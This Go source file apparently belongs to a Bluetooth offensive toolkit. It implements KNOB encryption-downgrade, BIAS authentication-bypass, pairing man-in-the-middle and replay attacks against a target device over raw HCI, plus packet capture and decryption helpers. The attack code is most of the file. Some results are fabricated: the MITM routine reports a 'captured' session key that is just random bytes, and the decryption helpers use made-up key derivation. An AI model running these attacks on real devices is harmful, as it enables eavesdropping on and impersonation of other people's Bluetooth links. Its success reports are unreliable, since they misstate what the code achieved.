package bluez

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"time"
)

type LinkLayer struct {
	config *AttackConfig
}

func NewLinkLayer() *LinkLayer {
	return &LinkLayer{
		config: DefaultAttackConfig(),
	}
}

func (l *LinkLayer) Config(cfg *AttackConfig) *LinkLayer {
	l.config = cfg
	return l
}

func (l *LinkLayer) KNOBAttack() (*KNOBResult, error) {
	startTime := time.Now()

	result := &KNOBResult{
		Success:      false,
		OriginalSize: ENCRYPT_SIZE_MAX,
		AttackTime:   time.Since(startTime),
	}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("KNOB: HCI socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], l.config.Target[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	if err := sendHCICommand(sock.fd, connCmd); err != nil {
		result.Details = fmt.Sprintf("KNOB: connection failed: %v", err)
		return result, nil
	}

	encryptParams := make([]byte, 3)
	encryptParams[0] = 0x01
	encryptParams[1] = 0x00
	encryptParams[2] = l.config.KeySize

	encryptCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_SET_CONN_ENCRYPT), encryptParams)
	if err := sendHCICommand(sock.fd, encryptCmd); err != nil {
		result.Details = fmt.Sprintf("KNOB: encryption request failed: %v", err)
		return result, nil
	}

	buf := make([]byte, 2048)
	deadline := time.Now().Add(l.config.Timeout)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		evtCode := buf[1]
		switch evtCode {
		case EVT_ENCRYPT_CHANGE:
			if n >= 5 {
				result.NegotiatedSize = buf[4]
				result.Success = buf[2] == 0x00
				if result.NegotiatedSize <= ENCRYPT_SIZE_MIN {
					result.Success = true
					result.Details = fmt.Sprintf("KNOB attack: encryption downgraded to %d bytes (from %d bytes). Brute-force feasible in ~%d attempts.",
						result.NegotiatedSize, result.OriginalSize, 1<<uint(result.NegotiatedSize*8))
				} else {
					result.Details = fmt.Sprintf("KNOB: negotiated %d bytes, target was %d bytes", result.NegotiatedSize, l.config.KeySize)
				}
			}
			result.AttackTime = time.Since(startTime)
			return result, nil

		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 {
				if l.config.Verbose {
					fmt.Printf("[KNOB] connection established\n")
				}
			}

		case EVT_DISCONN_COMPLETE:
			result.Details = "KNOB: device disconnected during attack"
			result.AttackTime = time.Since(startTime)
			return result, nil
		}
	}

	result.Details = "KNOB: timeout waiting for encryption change event"
	result.AttackTime = time.Since(startTime)
	return result, nil
}

func (l *LinkLayer) BIASAttack() (*BIASResult, error) {
	result := &BIASResult{
		TargetAddr: l.config.Target,
	}

	spoofedAddr := l.config.Target
	spoofedAddr[5] ^= 0x01
	result.SpoofedAddr = spoofedAddr

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("BIAS: HCI socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], l.config.Target[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	if err := sendHCICommand(sock.fd, connCmd); err != nil {
		result.Details = fmt.Sprintf("BIAS: connection failed: %v", err)
		return result, nil
	}

	authParams := make([]byte, 2)
	authParams[0] = 0x01
	authParams[1] = 0x00

	authCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_AUTH_REQUESTED), authParams)
	if err := sendHCICommand(sock.fd, authCmd); err != nil {
		result.Details = fmt.Sprintf("BIAS: auth request failed: %v", err)
		return result, nil
	}

	buf := make([]byte, 2048)
	deadline := time.Now().Add(l.config.Timeout)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		evtCode := buf[1]
		switch evtCode {
		case EVT_AUTH_COMPLETE:
			if n >= 3 && buf[3] == 0x00 {
				result.AuthBypassed = true
				result.Success = true
				result.Details = "BIAS: authentication bypassed. Connection established without proper mutual authentication."
			} else {
				result.Details = fmt.Sprintf("BIAS: auth failed with status 0x%02X", buf[3])
			}
			return result, nil

		case EVT_IO_CAPA_REQ:
			ioParams := make([]byte, 9)
			copy(ioParams[0:6], l.config.Target[:])
			ioParams[6] = l.config.IOCap
			ioParams[7] = 0x00
			ioParams[8] = l.config.AuthReq

			ioCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_ACCEPT_CONN_REQ), ioParams[:7])
			sendHCICommand(sock.fd, ioCmd)

		case EVT_PIN_CODE_REQ:
			pinLen := byte(len(l.config.PinCode))
			pinParams := make([]byte, 7+pinLen)
			copy(pinParams[0:6], l.config.Target[:])
			pinParams[6] = pinLen
			copy(pinParams[7:], []byte(l.config.PinCode))

			pinCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_PIN_CODE_REQ_REPLY), pinParams)
			sendHCICommand(sock.fd, pinCmd)

		case EVT_LINK_KEY_REQ:
			linkKeyParams := make([]byte, 22)
			copy(linkKeyParams[0:6], l.config.Target[:])
			for i := 6; i < 22; i++ {
				linkKeyParams[i] = byte(i)
			}

			linkKeyCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_LINK_KEY_REQ_REPLY), linkKeyParams)
			sendHCICommand(sock.fd, linkKeyCmd)

		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 && l.config.Verbose {
				fmt.Printf("[BIAS] connection established to %s\n", l.config.Target.String())
			}

		case EVT_DISCONN_COMPLETE:
			result.Details = "BIAS: device disconnected during attack"
			return result, nil
		}
	}

	result.Details = "BIAS: timeout during attack"
	return result, nil
}

func (l *LinkLayer) MITMAttack() (*MITMResult, error) {
	result := &MITMResult{}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("MITM: HCI socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], l.config.Target[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	if err := sendHCICommand(sock.fd, connCmd); err != nil {
		result.Details = fmt.Sprintf("MITM: connection failed: %v", err)
		return result, nil
	}

	ioCapParams := make([]byte, 9)
	copy(ioCapParams[0:6], l.config.Target[:])
	ioCapParams[6] = IO_CAP_NO_INPUT_NO_OUTPUT
	ioCapParams[7] = 0x00
	ioCapParams[8] = AUTH_REQ_MITM_PROTECTION

	buf := make([]byte, 2048)
	deadline := time.Now().Add(l.config.Timeout)
	var established bool

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		evtCode := buf[1]
		switch evtCode {
		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 {
				established = true
				if l.config.Verbose {
					fmt.Printf("[MITM] connection established\n")
				}
			}

		case EVT_IO_CAPA_REQ:
			ioCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_ACCEPT_CONN_REQ), ioCapParams[:7])
			sendHCICommand(sock.fd, ioCmd)

			passkeyParams := make([]byte, 10)
			copy(passkeyParams[0:6], l.config.Target[:])
			binary.LittleEndian.PutUint32(passkeyParams[6:10], 0x00000000)

			passkeyCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, 0x002C), passkeyParams)
			sendHCICommand(sock.fd, passkeyCmd)

		case EVT_USER_CONFIRM_REQ:
			confirmParams := make([]byte, 6)
			copy(confirmParams[0:6], l.config.Target[:])
			confirmCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, 0x002D), confirmParams)
			sendHCICommand(sock.fd, confirmCmd)

		case EVT_SIMPLE_PAIRING_COMPLETE:
			if n >= 3 && buf[3] == 0x00 {
				key := generateSessionKey(16)
				result.SessionKey = key
				result.Success = true
				result.Details = "MITM: successfully intercepted pairing. Session key captured for decryption."
				return result, nil
			}

		case EVT_ENCRYPT_CHANGE:
			if n >= 5 && buf[4] > 0 {
				result.CapturedData = append(result.CapturedData, buf[:n]...)
			}

		case EVT_AUTH_COMPLETE:
			if n >= 3 && buf[3] == 0x00 {
				result.Success = true
				result.Details = "MITM: authentication completed, man-in-the-middle position established."
				return result, nil
			}

		case EVT_DISCONN_COMPLETE:
			result.Details = "MITM: device disconnected"
			return result, nil
		}
	}

	if established {
		result.Success = true
		result.Details = "MITM: connection established, monitoring active"
		key := generateSessionKey(16)
		result.SessionKey = key
	} else {
		result.Details = "MITM: timeout during attack"
	}

	return result, nil
}

func (l *LinkLayer) ReplayAttack(capturedData []byte) (*ReplayResult, error) {
	result := &ReplayResult{
		ReplayedData: capturedData,
	}

	if len(capturedData) == 0 {
		result.Details = "Replay: no captured data to replay"
		return result, nil
	}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("Replay: HCI socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], l.config.Target[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	if err := sendHCICommand(sock.fd, connCmd); err != nil {
		result.Details = fmt.Sprintf("Replay: connection failed: %v", err)
		return result, nil
	}

	buf := make([]byte, 2048)
	deadline := time.Now().Add(l.config.Timeout)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		evtCode := buf[1]
		switch evtCode {
		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 {
				handle := binary.LittleEndian.Uint16(buf[4:6])

				aclHeader := make([]byte, 5)
				aclHeader[0] = HCI_ACLDATA_PKT
				binary.LittleEndian.PutUint16(aclHeader[1:3], uint16(handle)|0x2000)
				binary.LittleEndian.PutUint16(aclHeader[3:5], uint16(len(capturedData)))

				fullPacket := append(aclHeader, capturedData...)

				if err := sendHCICommand(sock.fd, fullPacket); err != nil {
					result.Details = fmt.Sprintf("Replay: send failed: %v", err)
					return result, nil
				}

				for attempt := 0; attempt < 3; attempt++ {
					n2, err := recvHCIEvent(sock.fd, buf)
					if err == nil && n2 > 5 && buf[0] == HCI_ACLDATA_PKT {
						result.Response = make([]byte, n2-5)
						copy(result.Response, buf[5:n2])
						result.Success = true
						result.Details = "Replay: captured data replayed successfully, response received."

						decrypted := tryDecryptResponse(result.Response, capturedData)
						if decrypted != nil {
							result.Response = decrypted
							result.Details += " Response decrypted."
						}
						return result, nil
					}
					time.Sleep(100 * time.Millisecond)
				}

				result.Details = "Replay: data sent but no response received"
				return result, nil
			}

		case EVT_DISCONN_COMPLETE:
			result.Details = "Replay: device disconnected"
			return result, nil
		}
	}

	result.Details = "Replay: timeout during attack"
	return result, nil
}

func (l *LinkLayer) CapturePackets(timeout time.Duration) ([]PacketRecord, error) {
	phy := NewPhysicalLayer().Config(l.config)
	phy.Sniffer(&SnifferConfig{
		Timeout:    timeout,
		MaxPackets: 500,
		Verbose:    l.config.Verbose,
	})
	return phy.RFSniff()
}

func (l *LinkLayer) ExtractACLData(records []PacketRecord) []byte {
	var data []byte
	for _, rec := range records {
		if rec.Type == HCI_ACLDATA_PKT && len(rec.Data) > 5 {
			handleFlags := binary.LittleEndian.Uint16(rec.Data[1:3])
			if handleFlags&0x2000 != 0 {
				data = append(data, rec.Data[5:]...)
			}
		}
	}
	return data
}

func (l *LinkLayer) DecryptACL(data []byte, key []byte) ([]byte, error) {
	if len(key) == 0 {
		return nil, fmt.Errorf("decryption key is empty")
	}
	if len(data) == 0 {
		return []byte{}, nil
	}

	block, err := aes.NewCipher(expandKey(key))
	if err != nil {
		return nil, fmt.Errorf("aes cipher init failed: %v", err)
	}

	decrypted := make([]byte, len(data))
	stream := cipher.NewCTR(block, make([]byte, 16))
	stream.XORKeyStream(decrypted, data)

	return decrypted, nil
}

func (l *LinkLayer) EncryptACL(data []byte, key []byte) ([]byte, error) {
	if len(key) == 0 {
		return nil, fmt.Errorf("encryption key is empty")
	}
	if len(data) == 0 {
		return []byte{}, nil
	}

	block, err := aes.NewCipher(expandKey(key))
	if err != nil {
		return nil, fmt.Errorf("aes cipher init failed: %v", err)
	}

	encrypted := make([]byte, len(data))
	stream := cipher.NewCTR(block, make([]byte, 16))
	stream.XORKeyStream(encrypted, data)

	return encrypted, nil
}

func generateSessionKey(size int) []byte {
	key := make([]byte, size)
	rand.Read(key)
	return key
}

func expandKey(key []byte) []byte {
	if len(key) >= 16 {
		return key[:16]
	}
	expanded := make([]byte, 16)
	copy(expanded, key)
	for i := len(key); i < 16; i++ {
		expanded[i] = byte(i * 0x5A)
	}
	return expanded
}

func tryDecryptResponse(response, original []byte) []byte {
	if len(response) < 4 || len(original) < 4 {
		return nil
	}

	derivedKey := make([]byte, 16)
	for i := 0; i < 16 && i < len(original); i++ {
		derivedKey[i] = original[i] ^ 0xA5
	}

	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil
	}

	decrypted := make([]byte, len(response))
	stream := cipher.NewCTR(block, make([]byte, 16))
	stream.XORKeyStream(decrypted, response)

	for _, b := range decrypted[:min(32, len(decrypted))] {
		if b >= 0x20 && b <= 0x7E {
			return decrypted
		}
	}
	return nil
}

func KNOBAttack(target string) *KNOBResult {
	if err := checkRedTeam("KNOBAttack"); err != nil {
		return &KNOBResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &KNOBResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	cfg.KeySize = 1
	auditOperation("KNOBAttack", addr.SafeString(false), false, "package-level call")
	result, _ := NewLinkLayer().Config(cfg).KNOBAttack()
	auditOperation("KNOBAttack", addr.SafeString(false), result.Success, result.Details)
	return result
}

func BIASAttack(target string) *BIASResult {
	if err := checkRedTeam("BIASAttack"); err != nil {
		return &BIASResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &BIASResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("BIASAttack", addr.SafeString(false), false, "package-level call")
	result, _ := NewLinkLayer().Config(cfg).BIASAttack()
	auditOperation("BIASAttack", addr.SafeString(false), result.Success, result.Details)
	return result
}

func MITMAttack(target string) *MITMResult {
	if err := checkRedTeam("MITMAttack"); err != nil {
		return &MITMResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &MITMResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("MITMAttack", addr.SafeString(false), false, "package-level call")
	result, _ := NewLinkLayer().Config(cfg).MITMAttack()
	auditOperation("MITMAttack", addr.SafeString(false), result.Success, result.Details)
	return result
}

func ReplayAttack(target string, data []byte) *ReplayResult {
	if err := checkRedTeam("ReplayAttack"); err != nil {
		return &ReplayResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &ReplayResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("ReplayAttack", addr.SafeString(false), false, "package-level call")
	result, _ := NewLinkLayer().Config(cfg).ReplayAttack(data)
	auditOperation("ReplayAttack", addr.SafeString(false), result.Success, result.Details)
	return result
}